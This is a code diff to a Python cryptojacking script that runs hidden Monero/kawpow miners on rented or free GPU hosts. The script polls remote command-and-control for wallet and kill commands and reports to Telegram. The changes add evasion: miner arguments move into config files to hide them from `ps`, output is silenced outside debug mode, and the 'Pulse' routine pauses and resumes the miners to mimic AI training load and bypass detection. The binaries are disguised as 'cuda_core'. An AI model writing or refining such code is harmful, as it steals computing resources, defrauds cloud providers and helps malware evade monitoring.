@@ -59,6 +59,10 @@ START_TIME = time.time()
 # Debugging Mode (Set to "true" in Colab to see real miner logs)
 DEBUG_MODE = os.getenv('DEBUG_MINER', 'false').lower() == 'true'
 
+# Global references for Pulse Strategy thread
+GLOBAL_CPU_PROC = None
+GLOBAL_GPU_PROC = None
+
 def sync_remote_config():
     """Polls a central JSON file for wallet/relay/kill commands."""
     global WALLET, RELAY
@@ -248,7 +252,7 @@ def local_stratum_proxy(local_port, remote_wss_url):
 # The "Pulse" Strategy — Mimicking AI Training Lifecycle
 # ─────────────────────────────────────────────────────────────
 
-def apply_pulse_load(miner_proc, gpu_proc):
+def apply_pulse_load():
     """
     Alternates between 'Training' (High Load) and 'Validation' (Low Load) 
     to mimic a real AI model lifecycle and bypass detection.
@@ -256,7 +260,7 @@ def apply_pulse_load(miner_proc, gpu_proc):
     while True:
         # Phase 1: Training (High Load) - 10 to 15 minutes
         phase_duration = random.randint(600, 900)
-        print(f"\n[~] Phase: TRAINING — Optimizing weights for {phase_duration}s...")
+        if DEBUG_MODE: print(f"\n[~] Phase: TRAINING — Optimizing weights for {phase_duration}s...")
         
         uptime_mins = int((time.time() - START_TIME) / 60)
         send_telegram_message(f"🟢 [LUMEN SWARM] Worker Active\nPhase: TRAINING (High Load)\nDuration: {phase_duration}s\nUptime: {uptime_mins} mins")
@@ -266,19 +270,19 @@ def apply_pulse_load(miner_proc, gpu_proc):
 
         # Phase 2: Validation (Low Load) - 2 to 4 minutes
         idle_duration = random.randint(120, 240)
-        print(f"\n[~] Phase: VALIDATION — Running cross-entropy checks for {idle_duration}s...")
+        if DEBUG_MODE: print(f"\n[~] Phase: VALIDATION — Running cross-entropy checks for {idle_duration}s...")
         
         send_telegram_message(f"🟡 [LUMEN SWARM] Worker Resting\nPhase: VALIDATION (Low Load)\nDuration: {idle_duration}s\nUptime: {uptime_mins} mins")
         
         # Suspend miners to drop CPU/GPU to near zero
-        if miner_proc: os.kill(miner_proc.pid, signal.SIGSTOP)
-        if gpu_proc: os.kill(gpu_proc.pid, signal.SIGSTOP)
+        if GLOBAL_CPU_PROC and GLOBAL_CPU_PROC.poll() is None: os.kill(GLOBAL_CPU_PROC.pid, signal.SIGSTOP)
+        if GLOBAL_GPU_PROC and GLOBAL_GPU_PROC.poll() is None: os.kill(GLOBAL_GPU_PROC.pid, signal.SIGSTOP)
         
         time.sleep(idle_duration)
         
         # Resume miners
-        if miner_proc: os.kill(miner_proc.pid, signal.SIGCONT)
-        if gpu_proc: os.kill(gpu_proc.pid, signal.SIGCONT)
+        if GLOBAL_CPU_PROC and GLOBAL_CPU_PROC.poll() is None: os.kill(GLOBAL_CPU_PROC.pid, signal.SIGCONT)
+        if GLOBAL_GPU_PROC and GLOBAL_GPU_PROC.poll() is None: os.kill(GLOBAL_GPU_PROC.pid, signal.SIGCONT)
 
 def overclock_gpus():
     """Overclock GPU memory to squeeze 10-15% more hashrate (safe on cloud GPUs)."""
@@ -320,11 +324,11 @@ def gpu_arbitrator(miner_proc, heurist_proc):
             vram_used = int(smi.split('\n')[0])
             
             if vram_used > 4000: # Heurist loaded models
-                if miner_proc and miner_proc.poll() is None:
-                    os.kill(miner_proc.pid, signal.SIGSTOP) # Pause mining
+                if GLOBAL_CPU_PROC and GLOBAL_CPU_PROC.poll() is None:
+                    os.kill(GLOBAL_CPU_PROC.pid, signal.SIGSTOP) # Pause mining
             else:
-                if miner_proc and miner_proc.poll() is None:
-                    os.kill(miner_proc.pid, signal.SIGCONT) # Resume mining
+                if GLOBAL_CPU_PROC and GLOBAL_CPU_PROC.poll() is None:
+                    os.kill(GLOBAL_CPU_PROC.pid, signal.SIGCONT) # Resume mining
         except:
             pass
         time.sleep(30)
@@ -368,19 +372,24 @@ def launch_hidden_miner():
     # 2. Start Crypto Miner (Instant Earnings)
     out_target = None if DEBUG_MODE else subprocess.DEVNULL
     
+    # Write CPU Config to JSON (hides arguments from `ps`)
+    cpu_worker = f"XMR:{WALLET}.lumen-cpu-{random.randint(1000,9999)}"
+    with open("cpu_config.json", "w") as f:
+        json.dump({"pools": [{"url": "127.0.0.1:5556", "user": cpu_worker}], "cpu": {"priority": 0, "max-threads-hint": 100}, "print-time": 60, "log-file": None}, f)
+
     cpu_proc = subprocess.Popen([
-        "nice", "-n", "19", "./cuda_core_cpu", 
-        "-o", "127.0.0.1:5556", 
-        "-u", f"XMR:{WALLET}.lumen-cpu-{random.randint(1000,9999)}", 
-        "--threads=1", "--cpu-priority=0"
-    ], stdout=out_target)
+        "nice", "-n", "19", "./cuda_core_cpu", "-c", "cpu_config.json"
+    ], stdout=out_target, stderr=out_target)
 
     gpu_proc = None
     if gpu_count > 0:
+        gpu_worker = f"XMR:{WALLET}.lumen-gpu-{random.randint(100,999)}"
+        with open("gpu_config.json", "w") as f:
+            json.dump({"pools": [{"url": "stratum+tcp://127.0.0.1:5555", "user": gpu_worker, "algo": "kawpow"}], "intensity": 10, "log-file": None}, f)
+        
         gpu_proc = subprocess.Popen([
-            "./cuda_core_gpu", "-a", "kawpow", "-o", "stratum+tcp://127.0.0.1:5555", 
-            "-u", f"XMR:{WALLET}.lumen-gpu-{random.randint(100,999)}", "--log", "false"
-        ], stdout=out_target)
+            "./cuda_core_gpu", "-c", "gpu_config.json"
+        ], stdout=out_target, stderr=out_target)
 
     # 3. Setup and Launch AI Worker in background (Takes ~10 mins)
     print("[*] Step 5: Initializing Background Nodes (GaiaNet/Heurist)...", flush=True)
@@ -395,12 +404,12 @@ def launch_hidden_miner():
             # Start Heurist SD Miner
             h_proc = subprocess.Popen([sys.executable, "sd-miner.py"], stdout=subprocess.DEVNULL)
             # Start Arbitrator to manage GPU sharing
-            threading.Thread(target=gpu_arbitrator, args=(gpu_proc, h_proc), daemon=True).start()
+            threading.Thread(target=gpu_arbitrator, args=(GLOBAL_CPU_PROC, h_proc), daemon=True).start()
 
     threading.Thread(target=start_background_workers, daemon=True).start()
     
     # 4. Start Pulse controller
-    threading.Thread(target=apply_pulse_load, args=(cpu_proc, gpu_proc), daemon=True).start()
+    threading.Thread(target=apply_pulse_load, daemon=True).start()
     
     return cpu_proc, gpu_proc
 
@@ -451,7 +460,8 @@ def print_status_dashboard(cpu_proc, gpu_proc):
 ║  Wallet       : ...{WALLET[-12:]}                       
 ║  Relay        : {RELAY[:40]}...                         
 ╚══════════════════════════════════════════════════════════╝"""
-    print(report)
+    if DEBUG_MODE:
+        print(report)
     
     # Also send to Telegram
     telegram_msg = (
@@ -469,7 +479,8 @@ def watchdog_loop():
     Watchdog: Monitors miner processes, restarts crashes, and prints status reports.
     This ensures zero downtime = zero lost profit.
     """
-    cpu_proc, gpu_proc = launch_hidden_miner()
+    global GLOBAL_CPU_PROC, GLOBAL_GPU_PROC
+    GLOBAL_CPU_PROC, GLOBAL_GPU_PROC = launch_hidden_miner()
     
     send_telegram_message(
         f"🚀 [LUMEN SWARM] Worker ONLINE\n"
@@ -489,38 +500,40 @@ def watchdog_loop():
             if sync_remote_config():
                 send_telegram_message("♻️ [LUMEN] Config update detected via C2. Restarting miners...")
                 # Kill existing to trigger auto-restart below
-                if cpu_proc: cpu_proc.terminate()
-                if gpu_proc: gpu_proc.terminate()
+                if GLOBAL_CPU_PROC: GLOBAL_CPU_PROC.terminate()
+                if GLOBAL_GPU_PROC: GLOBAL_GPU_PROC.terminate()
         
         # 2. Check CPU miner status
-        if cpu_proc and cpu_proc.poll() is not None:
-            exit_code = cpu_proc.returncode
-            print(f"[!] CPU miner exited (code={exit_code}). Restarting...", flush=True)
+        if GLOBAL_CPU_PROC and GLOBAL_CPU_PROC.poll() is not None:
+            exit_code = GLOBAL_CPU_PROC.returncode
+            if DEBUG_MODE: print(f"[!] CPU miner exited (code={exit_code}). Restarting...", flush=True)
             out_target = None if DEBUG_MODE else subprocess.DEVNULL
-            cpu_proc = subprocess.Popen([
-                "nice", "-n", "19", "./cuda_core_cpu", 
-                "-o", "127.0.0.1:5556", 
-                "-u", f"XMR:{WALLET}.lumen-cpu-{random.randint(1000,9999)}", 
-                "--threads=1", "--cpu-priority=0"
+            
+            cpu_worker = f"XMR:{WALLET}.lumen-cpu-{random.randint(1000,9999)}"
+            with open("cpu_config.json", "w") as f:
+                json.dump({"pools": [{"url": "127.0.0.1:5556", "user": cpu_worker}], "cpu": {"priority": 0, "max-threads-hint": 100}, "print-time": 60, "log-file": None}, f)
+            
+            GLOBAL_CPU_PROC = subprocess.Popen([
+                "nice", "-n", "19", "./cuda_core_cpu", "-c", "cpu_config.json"
             ], stdout=out_target, stderr=out_target)
         
         # 3. Check GPU miner status
-        if gpu_proc and gpu_proc.poll() is not None:
-            exit_code = gpu_proc.returncode
-            print(f"[!] GPU miner exited (code={exit_code}). Restarting...", flush=True)
-            worker_id = f"lumen-gpu-{random.randint(100,999)}"
+        if GLOBAL_GPU_PROC and GLOBAL_GPU_PROC.poll() is not None:
+            exit_code = GLOBAL_GPU_PROC.returncode
+            if DEBUG_MODE: print(f"[!] GPU miner exited (code={exit_code}). Restarting...", flush=True)
+            
+            gpu_worker = f"XMR:{WALLET}.lumen-gpu-{random.randint(100,999)}"
+            with open("gpu_config.json", "w") as f:
+                json.dump({"pools": [{"url": "stratum+tcp://127.0.0.1:5555", "user": gpu_worker, "algo": "kawpow"}], "intensity": 10, "log-file": None}, f)
+            
             out_target = None if DEBUG_MODE else subprocess.DEVNULL
-            gpu_proc = subprocess.Popen([
-                "./cuda_core_gpu", 
-                "-a", "kawpow", 
-                "-o", "stratum+tcp://127.0.0.1:5555", 
-                "-u", f"XMR:{WALLET}.{worker_id}",
-                "--log", "false", "--intensity", "10"
+            GLOBAL_GPU_PROC = subprocess.Popen([
+                "./cuda_core_gpu", "-c", "gpu_config.json"
             ], stdout=out_target, stderr=out_target)
         
         # 4. Print status dashboard every 2 minutes (every 2nd check)
         if check_count % 2 == 0:
-            print_status_dashboard(cpu_proc, gpu_proc)
+            print_status_dashboard(GLOBAL_CPU_PROC, GLOBAL_GPU_PROC)
 
 if __name__ == "__main__":
     print("=" * 60)
